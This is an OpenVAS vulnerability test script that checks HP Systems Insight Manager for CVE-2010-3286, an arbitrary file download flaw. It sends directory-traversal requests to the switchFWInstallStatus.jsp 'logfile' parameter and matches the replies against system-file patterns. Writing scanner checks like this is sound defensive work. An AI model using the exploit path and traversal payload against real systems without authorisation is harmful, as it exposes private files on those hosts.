###############################################################################
# OpenVAS Vulnerability Test
#
# HP Systems Insight Manager Arbitrary File Download Vulnerability
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (C) 2010 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:hp:systems_insight_manager";

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.100873");
  script_version("2022-05-02T09:35:37+0000");
  script_tag(name:"last_modification", value:"2022-05-02 09:35:37 +0000 (Mon, 02 May 2022)");
  script_tag(name:"creation_date", value:"2010-10-28 13:41:07 +0200 (Thu, 28 Oct 2010)");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_cve_id("CVE-2010-3286");

  script_name("HP Systems Insight Manager Arbitrary File Download Vulnerability");

  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/44098");
  script_xref(name:"URL", value:"http://www13.itrc.hp.com/service/cki/docDisplay.do?docId=emr_na-c02548231");

  script_tag(name:"qod_type", value:"remote_vul");
  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_copyright("Copyright (C) 2010 Greenbone Networks GmbH");
  script_dependencies("gb_hp_hpe_systems_insight_manager_http_detect.nasl", "os_detection.nasl");
  script_require_ports("Services/www", 5000);
  script_mandatory_keys("hp_hpe/systems_insight_manager/http/detected");

  script_tag(name:"solution_type", value:"VendorFix");

  script_tag(name:"solution", value:"Vendor updates are available. Please see the references for more
  information.");

  script_tag(name:"summary", value:"HP Systems Insight Manager is prone to a vulnerability that lets
  attackers download arbitrary files.");

  script_tag(name:"impact", value:"Exploiting this issue will allow an attacker to view arbitrary files
  within the context of the application. Information harvested may aid in launching further attacks.");

  script_tag(name:"affected", value:"HP Systems Insight Manager versions 6.0 and 6.1.");

  exit(0);
}

include("host_details.inc");
include("os_func.inc");
include("http_func.inc");
include("misc_func.inc");

if(!port = get_app_port(cpe:CPE, service:"www"))
  exit(0);

if(!get_app_location(cpe:CPE, port:port, nofork:TRUE))
  exit(0);

files = traversal_files();

foreach pattern(keys(files)) {

  soc = http_open_socket(port);
  if(!soc)
    continue;

  if(files[pattern] =~ "\.ini$") {
    file = "..\\..\\..\\..\\..\\..\\..\\" + files[pattern];
    file = str_replace(string:file, find:"/", replace:"\\");
  } else {
    file = "/" + files[pattern];
  }

  url = "/mxportal/taskandjob/switchFWInstallStatus.jsp?logfile=" + file;
  req = string("HEAD ", url, " HTTP/1.0\r\n\r\n");
  send(socket:soc, data:req);
  r = http_recv(socket:soc);
  http_close_socket(soc);

  if(!r)
    continue;

  if(egrep(pattern:pattern, string:r)) {
    report = http_report_vuln_url(port:port, url:url);
    security_message(port:port, data:report);
    exit(0);
  }
}

exit(0);
